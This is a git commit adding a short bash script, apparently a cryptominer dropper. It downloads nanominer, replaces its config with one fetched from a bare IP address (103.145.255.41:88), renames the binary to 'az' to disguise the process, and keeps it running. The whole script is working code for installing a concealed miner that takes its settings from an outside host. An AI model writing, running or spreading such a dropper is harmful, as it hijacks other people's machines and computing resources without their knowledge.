f62dcfe3a022c3af4704af4c1c059e5a237b2c4e
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2020-12-15 19:19:29 +0700

    Create taolao.sh

---
+++ taolao.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+if [ -f ${PWD}/nanominer-linux-3.1.4/az ]; then
+    if pgrep -x "az" > /dev/null
+then
+	echo " Ok roi"
+else
+cd nanominer-linux-3.1.4 && ./az
+
+fi
+exit
+fi
+
+wget https://github.com/nanopool/nanominer/releases/download/v3.1.4/nanominer-linux-3.1.4.tar.gz && tar xvzf nanominer-linux-3.1.4.tar.gz && cd nanominer-linux-3.1.4 && rm config.ini && wget http://103.145.255.41:88/config.ini && mv nanominer az && ./az
